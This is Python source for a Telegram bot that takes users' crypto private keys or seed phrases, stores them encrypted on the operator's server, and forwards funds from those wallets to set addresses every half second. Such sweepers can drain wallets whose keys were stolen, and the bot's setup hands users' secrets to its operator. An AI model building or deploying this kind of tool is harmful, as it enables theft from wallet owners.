from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
import asyncio
import logging
import json
import os
from cryptography.fernet import Fernet
import threading
from threading import Lock
from datetime import datetime

from chains import solana, ethereum, bsc
from config import TELEGRAM_BOT_TOKEN

# ---------------- CONFIG ----------------
app = Flask(__name__)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

DATA_FILE = "wallets.json"
SECRET_KEY = os.getenv("SECRET_KEY")
PORT = int(os.getenv("PORT", 5000))

cipher = Fernet(SECRET_KEY.encode())
data_store = {}          # user_id -> list of wallets
sweeper_running = True
data_lock = Lock()

def encrypt(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt(data: str) -> str:
    return cipher.decrypt(data.encode()).decode()

def load_data():
    global data_store
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f:
                data_store = {int(k): v for k, v in json.load(f).items()}
            logger.info(f"✅ Loaded {sum(len(v) for v in data_store.values())} wallets")
        except Exception as e:
            logger.error(f"Load error: {e}")

def save_data():
    try:
        with data_lock:
            with open(DATA_FILE, "w") as f:
                json.dump(data_store, f, indent=2)
    except Exception as e:
        logger.error(f"Save error: {e}")

# ---------------- FLASK ----------------
@app.route("/")
def home():
    return "Sweeper Bot Running ✅"

def main_menu():
    keyboard = [
        [InlineKeyboardButton("➕ Add Wallet", callback_data="add")],
        [InlineKeyboardButton("📋 My Wallets", callback_data="list")],
        [InlineKeyboardButton("🗑 Remove Last", callback_data="remove")],
        [InlineKeyboardButton("▶️ Start Sweeper" if not sweeper_running else "⏹ Stop Sweeper", callback_data="toggle")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ---------------- BOT HANDLERS ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⚡ **Fast Crypto Sweeper Bot**\n\nClick buttons below:", 
                                  parse_mode="Markdown", reply_markup=main_menu())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global sweeper_running
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "add":
        await query.edit_message_text(
            "Send command in this format:\n"
            "`/add solana YOUR_PRIVATE_KEY_OR_SEED DESTINATION_ADDRESS`\n\n"
            "Example:\n/add solana ABCdef...123 0x1234567890abcdef...",
            parse_mode="Markdown"
        )
        return

    elif query.data == "list":
        await list_wallets(query, user_id)
    elif query.data == "remove":
        await remove_last_wallet(query, user_id)
    elif query.data == "toggle":
        sweeper_running = not sweeper_running
        status = "🟢 **Started**" if sweeper_running else "⭕ **Stopped**"
        await query.edit_message_text(f"{status} Sweeper", reply_markup=main_menu())

async def add_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 3:
        await update.message.reply_text("Usage: `/add <chain> <secret> <destination>`", parse_mode="Markdown")
        return

    chain = context.args[0].lower()
    destination = context.args[-1]
    secret_input = " ".join(context.args[1:-1])

    if chain not in ["solana", "ethereum", "bsc"]:
        await update.message.reply_text("Supported chains: solana, ethereum, bsc")
        return

    wallet = {
        "chain": chain,
        "type": "seed" if len(secret_input.split()) > 1 else "private_key",
        "secret": encrypt(secret_input),
        "destination": destination,
        "active": True
    }

    user_id = update.effective_user.id
    with data_lock:
        data_store.setdefault(user_id, []).append(wallet)
        save_data()

    await update.message.reply_text(f"✅ **{chain.upper()}** wallet added!\n→ {destination}", reply_markup=main_menu())

async def list_wallets(query, user_id):
    with data_lock:
        wallets = data_store.get(user_id, [])
    if not wallets:
        await query.edit_message_text("No wallets added yet.", reply_markup=main_menu())
        return

    text = "📋 **Your Wallets**\n\n"
    for i, w in enumerate(wallets):
        text += f"{i+1}. {w['chain'].upper()} → `{w['destination'][:12]}...`\n"
    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=main_menu())

async def remove_last_wallet(query, user_id):
    with data_lock:
        if user_id in data_store and data_store[user_id]:
            data_store[user_id].pop()
            if not data_store[user_id]:
                del data_store[user_id]
            save_data()
            await query.edit_message_text("🗑 Last wallet removed.", reply_markup=main_menu())
        else:
            await query.edit_message_text("No wallet to remove.", reply_markup=main_menu())

# ---------------- FAST SWEEPER ----------------
async def sweeper_loop():
    global sweeper_running
    logger.info("🚀 Fast Sweeper Loop Started (0.5s interval)")
    
    while True:
        if not sweeper_running:
            await asyncio.sleep(1)
            continue

        tasks = []
        with data_lock:
            current_wallets = list(data_store.items())

        for user_id, wallets in current_wallets:
            for wallet in wallets:
                if wallet.get("active", True):
                    tasks.append(process_single_wallet(user_id, wallet))

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

        await asyncio.sleep(0.5)   # Very fast check

async def process_single_wallet(user_id, wallet):
    try:
        secret = decrypt(wallet["secret"])
        chain_func = {
            "solana": solana.forward,
            "ethereum": ethereum.forward,
            "bsc": bsc.forward
        }[wallet["chain"]]

        # Run the forward function
        await asyncio.to_thread(chain_func, secret, wallet["destination"], user_id)
        
    except Exception as e:
        logger.error(f"Sweep error for user {user_id}: {e}")

# ---------------- MAIN ----------------
async def main():
    load_data()
    application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_wallet))
    application.add_handler(CallbackQueryHandler(button_handler))

    asyncio.create_task(sweeper_loop())

    logger.info("🤖 Bot Starting...")
    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)
    await asyncio.Event().wait()

if __name__ == "__main__":
    logger.info(f"Starting on port {PORT}")
    threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False),
        daemon=True
    ).start()
    asyncio.run(main())